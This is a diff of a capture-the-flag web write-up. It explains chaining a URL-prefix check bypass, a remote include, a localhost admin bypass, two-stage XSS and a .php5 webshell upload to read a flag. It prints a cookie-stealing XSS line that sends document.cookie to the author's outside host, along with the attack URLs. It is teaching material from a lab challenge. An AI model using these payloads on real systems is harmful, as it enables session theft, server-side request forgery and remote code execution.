@@ -21,51 +21,46 @@ tags: [cat/web, tools]
 
 ## Write-up
 
-First we can see only the `index.php` and conveniently we also get the source
-with the `?source=` parameter. After a little recon, we also found that there
-is a `admin.php` that also prints it's source with `?source=`. How convenient!
+First we accessed the webapp's `index.php`. Conveniently it was possible to retreive the php source code using the `?source` get parameter. After some recon we also found that there exists an `admin.php` file, which also prints its source using the `?source` get parameter. How convenient!
 
 ### "This is probably a XSS challenge"
 
-There is a contact page, which says:
+On the main page (served by `indey.php`) is a *contact* page, which says:
 
-```
-Found an URL that doesn\'t work? Please submit it using the form below and one of our representatives will review the submission as fast as possible.
-```
+> Found an URL that doesn\'t work? Please submit it using the form below and one of our representatives will review the submission as fast as possible.
 
-We were pretty sure that the representative was a bot :) For testing we
-submitted a URL we controlled but that didn't result in anything. The source of
-`admin.php` revealed the reason why:
+We were pretty sure that the representative visiting the submitted url was a bot :) For testing we submitted a URL we controlled, but that didn't result in anything. The source of `admin.php` revealed the reason why (comments by us):
 
 ```php
 switch($page) {
-[...]
+// [...]
     case 'logs':
-        # this is probably visisted by the bot
+        // this case is probably visisted by the bot
         $title = 'Logs';
         $rows = $db->query('SELECT * FROM urls WHERE view=0');
         while($row = $rows->fetch_array()) {
-            # only the URLs are shown which match some hardcoded host
+            // only the URLs which match some hardcoded host are shown (and visited)
             if(parse_url($row['url'], PHP_URL_HOST) != parse_url($config['url'], PHP_URL_HOST))
                 continue;
-            //todo update link below
             $content .= '<div class="r"><a href="'.htmlentities($row['url']).'">Report '.$row['id'].'</a><a href="http://localhost/admin.php?page=hide&id='.$row['id'].'">Hide</a></div>';
         }
     break;
     case 'hide':
         $id = intval(@$_REQUEST['id']);
         $db->query('UPDATE urls set view=1 where id='.$id);
-[...]
+//[...]
 ```
 
-Only URLs are shown which match some hardcoded host. So the bot never got to
-see our submitted URLs. Let's see how we can bypass this.
+Only URLs which match some hardcoded host are shown (and therefore visited). So the bot never got to see our submitted URLs. Let's see how we can bypass this check. 
+
+But first for something different ...
 
 ### Include from arbitrary URL
 
-There is this rather strange handling of the `page=print` case:
+There is this rather strange handling of the `page=print` case in the `index.php`:
 
-```
+
+```php
     case 'print':
         $url   = base64_decode($_REQUEST['url']);
         $title = '';
@@ -79,13 +74,10 @@ There is this rather strange handling of the `page=print` case:
     break;
 ```
 
-So this will include anything that comes from a provided URL. Unfortunately
-they check that the provided URL begins with a certain string. By playing
-around a little bit, we can deduce that the provided URL must begin with
-`http://10.13.37.13`.
+This code will download and include anything that comes from a url provided via (base64 encoded) get parameter. Unfortunately there is a check that requires the provided URL to begin with a certain string. By playing around a little bit, we can deduce that the provided URL must begin with the webapp's host/ip, therefore `http://10.13.37.13`.
 
-Interestingly here we can see that the URL doesn't end in a `/` or someting
-like that so we can bypass the check using two different methods:
+Interestingly here we can see that the URL doesn't end in a `/`, or someting
+like that, so we can bypass the check using either of two different methods:
 
 ```
 http://10.13.37.13@example.com/
@@ -93,8 +85,7 @@ http://10.13.37.13.example.com/
 ```
 
 Both start with the correct string, but point to totally different domains.
-That way we can get the server to include arbitrary HTML content from a remote
-location. This starts to be interesting :)
+That way we can get the server to include arbitrary HTML content from a remote location. This starts to be interesting. :)
 
 ### First XSS tests
 
@@ -162,17 +153,13 @@ document.write("<img src=\"http://f0rki.at/" + document.cookie + "\" />");
 </html>
 ```
 
-So we can see that the server included our xss payload. We submitted this URL
-for checking and this bypasses the proper host checking, because of course this
-is a URL on the same site. After a couple of seconds we could see that some
-client connects to our webserver, fetches the payload and then we can check the
-error logs for the cookie. The cookie doesn't buy us much because it's not used
-anywhere. We will need a different XSS payload.
+So we can see that the server included our xss payload. We submitted the URL triggering the xss (`http://10.13.37.13/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzLmYwcmtpLmF0L3hzcy5o`) for checking (via the *contact* page, see above). 
 
+This url also bypasses the proper host checking in `admin.php`, because of course this is a URL on the same site. After a couple of seconds we could see that some client (the bot) connects to our webserver, fetches the payload and then we can check the error logs for the cookie, etc. But in that case the cookie doesn't buy us much, since it's not used anywhere. We need a different XSS payload.
 
 ### The admin.php 127.0.0.1 check
 
-Unfortunately the `admin.php` script had a rather nasty check at the top:
+Unfortunately the `admin.php` script had a rather lazy, but for a xss hacker also nasty check at the top:
 
 ```php
 //lazy admin approach to "authenticate"
@@ -181,7 +168,7 @@ if($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
 }
 ```
 
-For get requests we can bypass this using the trick from above:
+We can bypass this check using the trick from above, including a *localhost* page instead of our xss endpoint. The `index.php` (loading the file via its `print` view) is is able to reach the `admin.php` via a localhost connection and therefore passes the authentication check.
 
 ```
 $ python relay.py 'http://10.13.37.13@127.0.0.1/admin.php'
@@ -221,51 +208,60 @@ http://10.13.37.13/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzQDEyNy4wLjAuMS9hZG1pb
 ```
 
 Unfortunately this doesn't help us much, since there is no interesting
-functionality reachable with `GET` requests.
+functionality in `admin.php` reachable with `GET` requests.
+
 
 ### Abusing XSS to upload a webshell
 
-The `admin.php` has an interesting feature. One can upload files to a known
-location using `?page=upload`. But we have one problem, that we learned about
-the hard way.
+But the `admin.php` has another interesting feature. One can upload files to a known location using `?page=upload`. But we still have one problem, that we learned about the hard way.
 
 The bot first visists `http://127.0.0.1/admin.php?page=logs` and then clicks on
-all the links that are not yet hidden and will hide them then. The links are
-all to the host `http://13.37.37.13/`, because here they use a proper URL
-parser to check the host. But then the bot's browser is not on the origin
-`127.0.0.1` anymore and any request we perform to `http://127.0.0.1/admin.php`
-is a cross-origin request. The same-origin policy at least prevents us from
-reading the response. We tried firing blind file upload `POSTs` but that didn't
-work out so well, probably because the `$_SERVER['REMOTE_ADDR']` s then set to
-something other that `127.0.0.1`.
+all the submitted links that are not yet hidden and will hide them them. The links are all to the host `http://13.37.37.13/`, since in contrast to the url check in `index.php` there is  a proper URL parser used to check the host. Following that, we are not able to open a page on `127.0.0.1` and therefore any request we perform to `http://127.0.0.1/admin.php` (post request to upload a file) is a cross-origin request. 
 
-It took us quite a while to find out how the pretty simple way to bypass this.
+The same-origin policy at least prevents us from reading the response. We tried firing blind file upload `POSTs` but that didn't work out so well, probably because the `$_SERVER['REMOTE_ADDR']` is then set to something other that `127.0.0.1`.
 
-We are gonna use two XSS stages. First we are
+It took us quite a while to find the pretty simple way to bypass this.
 
-1. Make bot visit
+### The final attack: Two-stage XSS
+
+We are gonna use two XSS stages.
+
+1. **Make bot visit stage 1 on our server**
    `http://10.13.37.13/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage1.html)`
-2. `stage1.html` redirects to
-   `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`
-   this way we change the origin back to `127.0.0.1` and can perfrom a `POST`
-   request with violating the same-origin policy.
-3. `stage2.html` payload makes an ajax request to
-    `http://127.0.0.1/admin.php?page=upload` to upload a file.
 
-The file upload code disallowed certain file extensions
+   **this passes the check in `admin.php` because the host is 10.13.37.13.**
+
+2. **Stage 1 html redirects to localhost xss, which loads stage 2**
+   `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`
+   
+   **this way we change the origin back to `127.0.0.1` and are able to perfrom `POST` requests without violating the same-origin policy.**
+
+3. **Stage 2 payload makes an ajax request** to
+    `http://127.0.0.1/admin.php?page=upload` **and uploads a file.**
+
+
+But the file upload code disallowed certain file extensions:
+
 ```php
-if($extension == '' || $extension == 'php' || $extension == 'htaccess' || $extension == 'pl' || $extension == 'py' || $extension == 'c' || $extension == 'cpp' || $extension == 'ini' || $extension == 'html') {
+if($extension == '' || $extension == 'php' || $extension == 'htaccess' 
+   || $extension == 'pl' || $extension == 'py' || $extension == 'c' 
+   || $extension == 'cpp' || $extension == 'ini' || $extension == 'html') { // fail
 ```
 
-Fortunately the `.php5` extension was not part of it so we just used that.
+Fortunately the `.php5` extension was not part of the blacklist, so we just used that.
 
 4. Uploade file with `.php5` extension and visit
    `http://10.13.37.13/uploads/file_with_more_than_twelve_chars.php5`
    to execute the webshell
-5. Executing `find / -name *flag* | xargs cat` revealed the flag in `/flag`
+5. Executing `find / -name *flag* | xargs cat` revealed the flag in `/flag`:
+
    `DCTF{5a42e723159e537443b99ba7f95fbe04}`
 
+:)
 
+---
+
+### Attack code
 
 Here is the `stage1.html` we used. Including some diagnostics exfiltrated via
 `img` tags.
